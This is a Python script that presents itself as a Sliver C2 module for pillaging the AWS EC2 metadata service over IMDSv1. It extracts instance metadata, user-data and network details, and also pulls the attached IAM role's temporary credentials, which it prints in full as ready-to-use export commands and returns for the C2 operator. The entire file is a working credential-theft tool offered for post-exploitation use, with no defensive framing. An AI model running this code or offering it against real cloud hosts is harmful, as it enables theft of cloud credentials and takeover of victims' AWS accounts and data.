#!/usr/bin/env python3
"""
Sliver C2 Module: AWS IMDSv1 Pillager
Exploits IMDSv1 to extract AWS credentials and metadata
"""

import json
import urllib.request
import urllib.error
from datetime import datetime

IMDS_BASE = "http://169.254.169.254"
TIMEOUT = 2

def log(message, level="INFO"):
    """Log message with timestamp"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] [{level}] {message}")

def fetch_metadata(path, base_url=IMDS_BASE):
    """Fetch data from IMDS endpoint"""
    url = f"{base_url}{path}"
    try:
        log(f"Fetching: {url}")
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=TIMEOUT) as response:
            data = response.read().decode('utf-8')
            return data
    except urllib.error.URLError as e:
        log(f"Failed to fetch {url}: {e}", "ERROR")
        return None
    except Exception as e:
        log(f"Unexpected error fetching {url}: {e}", "ERROR")
        return None

def get_instance_metadata():
    """Get basic instance metadata"""
    metadata = {}
    
    endpoints = {
        "instance-id": "/latest/meta-data/instance-id",
        "instance-type": "/latest/meta-data/instance-type",
        "ami-id": "/latest/meta-data/ami-id",
        "hostname": "/latest/meta-data/hostname",
        "local-ipv4": "/latest/meta-data/local-ipv4",
        "public-ipv4": "/latest/meta-data/public-ipv4",
        "availability-zone": "/latest/meta-data/placement/availability-zone",
        "region": "/latest/meta-data/placement/region",
        "mac": "/latest/meta-data/mac",
        "security-groups": "/latest/meta-data/security-groups",
    }
    
    for key, endpoint in endpoints.items():
        data = fetch_metadata(endpoint)
        if data:
            metadata[key] = data
            log(f"Retrieved {key}: {data[:50]}..." if len(data) > 50 else f"Retrieved {key}: {data}")
    
    return metadata

def get_iam_credentials():
    """Extract IAM role credentials from IMDSv1"""
    log("Attempting to extract IAM credentials...")
    
    # Get IAM role name
    role_name = fetch_metadata("/latest/meta-data/iam/security-credentials/")
    if not role_name:
        log("No IAM role found attached to instance", "WARNING")
        return None
    
    log(f"Found IAM role: {role_name}")
    
    # Get credentials for the role
    creds_path = f"/latest/meta-data/iam/security-credentials/{role_name}"
    creds_data = fetch_metadata(creds_path)
    
    if not creds_data:
        log("Failed to retrieve IAM credentials", "ERROR")
        return None
    
    try:
        creds = json.loads(creds_data)
        log("Successfully extracted IAM credentials!", "SUCCESS")
        
        # Sanitize output for logging
        safe_creds = {
            "AccessKeyId": creds.get("AccessKeyId", "")[:10] + "..." if creds.get("AccessKeyId") else "",
            "SecretAccessKey": "***REDACTED***",
            "Token": "***REDACTED***",
            "Expiration": creds.get("Expiration", ""),
            "Type": creds.get("Type", "")
        }
        log(f"Credentials summary: {json.dumps(safe_creds, indent=2)}")
        
        return creds
    except json.JSONDecodeError as e:
        log(f"Failed to parse credentials JSON: {e}", "ERROR")
        return None

def get_user_data():
    """Get user-data script (may contain secrets)"""
    log("Attempting to retrieve user-data...")
    
    user_data = fetch_metadata("/latest/user-data")
    if user_data:
        log(f"User-data retrieved ({len(user_data)} bytes)")
        # Check for potential secrets in user-data
        if any(keyword in user_data.lower() for keyword in ["password", "secret", "key", "token", "credential"]):
            log("WARNING: User-data may contain sensitive information!", "WARNING")
        return user_data
    else:
        log("No user-data found or accessible")
        return None

def get_network_interfaces():
    """Get network interface information"""
    interfaces = []
    macs = fetch_metadata("/latest/meta-data/network/interfaces/macs/")
    
    if macs:
        for mac in macs.strip().split('\n'):
            if mac.endswith('/'):
                mac = mac[:-1]
            
            interface = {"mac": mac}
            
            # Get VPC info
            vpc_id = fetch_metadata(f"/latest/meta-data/network/interfaces/macs/{mac}/vpc-id")
            subnet_id = fetch_metadata(f"/latest/meta-data/network/interfaces/macs/{mac}/subnet-id")
            security_groups = fetch_metadata(f"/latest/meta-data/network/interfaces/macs/{mac}/security-group-ids")
            
            if vpc_id:
                interface["vpc-id"] = vpc_id
            if subnet_id:
                interface["subnet-id"] = subnet_id
            if security_groups:
                interface["security-groups"] = security_groups.strip().split('\n')
            
            interfaces.append(interface)
            log(f"Found network interface: {mac} in VPC {vpc_id}")
    
    return interfaces

def save_results(data, filename="imds_pillage.json"):
    """Save pillaged data to file"""
    try:
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2, default=str)
        log(f"Results saved to {filename}", "SUCCESS")
        return True
    except Exception as e:
        log(f"Failed to save results: {e}", "ERROR")
        return False

def main():
    """Main execution function"""
    log("=" * 60)
    log("AWS IMDSv1 Pillager - Sliver C2 Module")
    log("=" * 60)
    
    # Check if IMDS is accessible
    test = fetch_metadata("/latest/")
    if not test:
        log("IMDS is not accessible from this host!", "CRITICAL")
        log("Possible reasons:")
        log("  - IMDSv2 is enforced (token required)")
        log("  - Network/firewall blocking access to 169.254.169.254")
        log("  - Not running on AWS EC2 instance")
        return
    
    log("IMDS is accessible! Starting pillage operation...")
    
    results = {
        "timestamp": datetime.now().isoformat(),
        "imds_version": "v1 (vulnerable)",
    }
    
    # Gather all metadata
    log("\n[+] Gathering instance metadata...")
    results["instance_metadata"] = get_instance_metadata()
    
    log("\n[+] Extracting IAM credentials...")
    credentials = get_iam_credentials()
    if credentials:
        results["iam_credentials"] = credentials
        log("\n*** CRITICAL FINDING ***", "CRITICAL")
        log("IAM credentials successfully extracted!", "CRITICAL")
        log("These can be used to access AWS services with the role's permissions", "CRITICAL")
    
    log("\n[+] Retrieving user-data...")
    user_data = get_user_data()
    if user_data:
        results["user_data"] = user_data[:1000]  # Limit size
        if len(user_data) > 1000:
            results["user_data_truncated"] = True
    
    log("\n[+] Enumerating network interfaces...")
    results["network_interfaces"] = get_network_interfaces()
    
    # Save results
    log("\n[+] Saving results...")
    save_results(results)
    
    # Print summary
    log("\n" + "=" * 60)
    log("PILLAGE COMPLETE!", "SUCCESS")
    log("=" * 60)
    
    if credentials:
        log("\n[!] EXTRACTED AWS CREDENTIALS:", "CRITICAL")
        print(f"""
Export these to use AWS CLI:
export AWS_ACCESS_KEY_ID={credentials.get('AccessKeyId', '')}
export AWS_SECRET_ACCESS_KEY={credentials.get('SecretAccessKey', '')}
export AWS_SESSION_TOKEN={credentials.get('Token', '')}

Test with: aws sts get-caller-identity
""")
    
    log("\nFull results saved to imds_pillage.json")
    
    # Return results for Sliver
    return json.dumps(results)

if __name__ == "__main__":
    main()